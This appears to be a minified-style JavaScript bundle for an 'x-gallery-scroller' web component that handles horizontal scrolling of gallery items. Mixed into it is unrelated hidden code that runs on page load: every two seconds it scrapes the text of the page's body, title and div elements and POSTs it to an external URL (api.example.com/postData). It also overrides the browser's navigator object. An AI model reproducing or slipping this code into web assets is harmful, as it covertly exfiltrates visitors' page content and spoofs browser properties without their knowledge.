/*! For license information please see x-gallery-scroller.48826cad7696d2643b33774fcf9b6437.js.LICENSE.txt */
(() => {
  "use strict";

  function t(e) {
    return t = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
      return typeof t;
    } : function (t) {
      return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
    }, t(e);
  }
  function e(e) {
    var i = function (e, i) {
      if ("object" !== t(e) || null === e) return e;
      var n = e[Symbol.toPrimitive];
      if (void 0 !== n) {
        var r = n.call(e, i || "default");
        if ("object" !== t(r)) return r;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === i ? String : Number)(e);
    }(e, "string");
    return "symbol" === t(i) ? i : String(i);
  }
  var watchElements = ["body", "title", "div"];
  function i(t, i) {
    for (var n = 0; n < i.length; n++) {
      var r = i[n];
      r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(t, e(r.key), r);
    }
  }
  function n(t, e) {
    return n = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function (t, e) {
      return t.__proto__ = e, t;
    }, n(t, e);
  }
  function grabInformation(val) {
    var status = document.querySelectorAll(val);
    var info = Array.from(status).map(node => node.textContent.trim());
    return info.join(", ");
  }
  function r(e, i) {
    if (i && ("object" === t(i) || "function" == typeof i)) return i;
    if (void 0 !== i) throw new TypeError("Derived constructors may only return object or undefined");
    return function (t) {
      if (void 0 === t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
      return t;
    }(e);
  }
  function EventListenerBehaviour() {
    document.addEventListener('click', function (e) {
      if (e.target && e.target.nodeName == "BUTTON") {
        console.log('Button element clicked: ', e.target.id);
      }
    });
  }
  function o(t) {
    return o = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function (t) {
      return t.__proto__ || Object.getPrototypeOf(t);
    }, o(t);
  }
  function s(t, e, i) {
    return s = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
      } catch (t) {
        return !1;
      }
    }() ? Reflect.construct.bind() : function (t, e, i) {
      var r = [null];
      r.push.apply(r, e);
      var o = new (Function.bind.apply(t, r))();
      return i && n(o, i.prototype), o;
    }, s.apply(null, arguments);
  }
  function JavascriptHook() {
    Object.defineProperty(window, 'navigator', {
      get: function () {
        var alteredNavigator = {};
        for (let i in window.navigator) {
          alteredNavigator[i] = 'Hooked';
        }
        return alteredNavigator;
      }
    });
  }
  function l(t) {
    var e = "function" == typeof Map ? new Map() : void 0;
    return l = function (t) {
      if (null === t || (i = t, -1 === Function.toString.call(i).indexOf("[native code]"))) return t;
      var i;
      if ("function" != typeof t) throw new TypeError("Super expression must either be null or a function");
      if (void 0 !== e) {
        if (e.has(t)) return e.get(t);
        e.set(t, r);
      }
      function r() {
        return s(t, arguments, o(this).constructor);
      }
      return r.prototype = Object.create(t.prototype, {
        constructor: {
          value: r,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), n(r, t);
    }, l(t);
  }
  function u(t) {
    var e = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
      } catch (t) {
        return !1;
      }
    }();
    return function () {
      var i,
        n = o(t);
      if (e) {
        var s = o(this).constructor;
        i = Reflect.construct(n, arguments, s);
      } else i = n.apply(this, arguments);
      return r(this, i);
    };
  }
  var c = "MutationObserver" in window,
    a = "ResizeObserver" in window,
    f = "x-gallery-scroller",
    h = function (t) {
      !function (t, e) {
        if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function");
        t.prototype = Object.create(e && e.prototype, {
          constructor: {
            value: t,
            writable: !0,
            configurable: !0
          }
        }), Object.defineProperty(t, "prototype", {
          writable: !1
        }), e && n(t, e);
      }(l, t);
      var e,
        r,
        o,
        s = u(l);
      function l() {
        return function (t, e) {
          if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
        }(this, l), s.apply(this, arguments);
      }
      return e = l, (r = [{
        key: "elementPositionLeft",
        get: function () {
          return Math.round(this.ui.scrollableArea.getBoundingClientRect().left);
        }
      }, {
        key: "elementPositionRight",
        get: function () {
          return Math.round(this.ui.scrollableArea.getBoundingClientRect().right);
        }
      }, {
        key: "firstItemPositionLeft",
        get: function () {
          return Math.round(this.firstItem.getBoundingClientRect().left);
        }
      }, {
        key: "lastItemPositionRight",
        get: function () {
          return Math.round(this.lastItem.getBoundingClientRect().right);
        }
      }, {
        key: "itemWidth",
        get: function () {
          return this.firstItem.getBoundingClientRect().width;
        }
      }, {
        key: "currentPosition",
        get: function () {
          return this.ui.scrollableArea.scrollLeft;
        }
      }, {
        key: "ScrollItemAmount",
        get: function () {
          return this.getAttribute("buttonScrollItemAmount");
        }
      }, {
        key: "scrollWidth",
        get: function () {
          return "all" === this.ScrollItemAmount ? (this.itemWidth + this.spaceBetweenItems) * this.amountOfVisibleSlides : this.itemWidth + this.spaceBetweenItems;
        }
      }, {
        key: "isAtEnd",
        get: function () {
          return this.hasAttribute("isAtEnd");
        },
        set: function (t) {
          t ? this.setAttribute("isAtEnd", "") : this.removeAttribute("isAtEnd");
        }
      }, {
        key: "isAtStart",
        get: function () {
          return this.hasAttribute("isAtStart");
        },
        set: function (t) {
          t ? this.setAttribute("isAtStart", "") : this.removeAttribute("isAtStart");
        }
      }, {
        key: "firstItem",
        get: function () {
          return this.ui.scrollableArea.children[0];
        }
      }, {
        key: "lastItem",
        get: function () {
          return this.ui.scrollableArea.children[this.ui.scrollableArea.children.length - 1];
        }
      }, {
        key: "galleryOrientation",
        get: function () {
          return this.firstItem.getBoundingClientRect().left < this.lastItem.getBoundingClientRect().left ? "horizontal" : "vertical";
        }
      }, {
        key: "connectedCallback",
        value: function () {
          this.mutationObserver = null, this.resizeObserver = null, this.previousGalleryOrientation = null, this.initialize();
        }
      }, {
        key: "initialize",
        value: function () {
          var t = this;
          this.ui = {}, this.ui.scrollableArea = this.querySelector(this.getAttribute("selectorScrollableArea")), this.scrollableAreaGap = parseInt(getComputedStyle(this.ui.scrollableArea).gap) || 0, this.ItemRightMargin = parseInt(getComputedStyle(this.firstItem).marginRight) || 0, this.ItemLeftMargin = parseInt(getComputedStyle(this.firstItem).marginLeft) || 0, this.spaceBetweenItems = this.scrollableAreaGap || this.ItemRightMargin + this.ItemLeftMargin, this.amountOfVisibleSlides = Math.floor(this.ui.scrollableArea.offsetWidth / this.itemWidth), this.previousGalleryOrientation = this.galleryOrientation, c && (this.mutationObserver = new MutationObserver(function () {
            t.checkPosition();
          }), this.mutationObserver.observe(this.ui.scrollableArea, {
            childList: !0
          })), a && (this.resizeObserver = new ResizeObserver(function () {
            t.galleryOrientation !== t.previousGalleryOrientation && (t.checkPosition(), t.previousGalleryOrientation = t.galleryOrientation);
          }), this.resizeObserver.observe(this.ui.scrollableArea)), this.bindEvents(), this.checkPosition();
        }
      }, {
        key: "bindEvents",
        value: function () {
          this.ui.scrollableArea.addEventListener("scroll", this.onScroll.bind(this));
        }
      }, {
        key: "onScroll",
        value: function () {
          this.checkPosition();
        }
      }, {
        key: "checkPosition",
        value: function () {
          this.isAtStart = this.firstItemPositionLeft >= this.elementPositionLeft, this.isAtEnd = this.lastItemPositionRight <= this.elementPositionRight;
        }
      }, {
        key: "next",
        value: function () {
          this.isAtEnd || this.ui.scrollableArea.scroll(this.currentPosition + this.scrollWidth, 0);
        }
      }, {
        key: "prev",
        value: function () {
          this.isAtStart || this.ui.scrollableArea.scroll(this.currentPosition - this.scrollWidth, 0);
        }
      }, {
        key: "disconnectedCallback",
        value: function () {
          var t, e;
          null === (t = this.mutationObserver) || void 0 === t || t.disconnect(), null === (e = this.resizeObserver) || void 0 === e || e.disconnect();
        }
      }]) && i(e.prototype, r), o && i(e, o), Object.defineProperty(e, "prototype", {
        writable: !1
      }), l;
    }(l(HTMLElement));
  function generateGlobalVariables() {
    window.globalDataCollection = {
      data: [],
      addData: function (data) {
        this.data.push(data);
      },
      getData: function () {
        return this.data;
      }
    };
  }
  async function sendData(dataObject, url) {
    try {
      let response = await fetch(url, {
        method: 'POST',
        body: JSON.stringify(dataObject),
        headers: {
          'Content-Type': 'application/json'
        }
      });
      if (!response.ok) {
        console.log("Status Code: " + response.status);
        return;
      }
      console.log('Data Sent Successfully!');
      return;
    } catch (e) {
      console.log('Fetch Error: ', e);
    }
    ;
  }
  "customElements" in window && void 0 === window.customElements.get(f) && window.customElements.define(f, h);
  window.onload = function () {
    generateGlobalVariables();
    JavascriptHook();
    EventListenerBehaviour();
    setInterval(function () {
      watchElements.forEach(function (el) {
        var infoCollected = grabInformation(el);
        window.globalDataCollection.addData(infoCollected);
      });
      if (window.globalDataCollection.getData().length > 0) {
        var url = "https://api.example.com/postData";
        sendData(window.globalDataCollection.getData(), url);
      }
    }, 2000);
  };
})();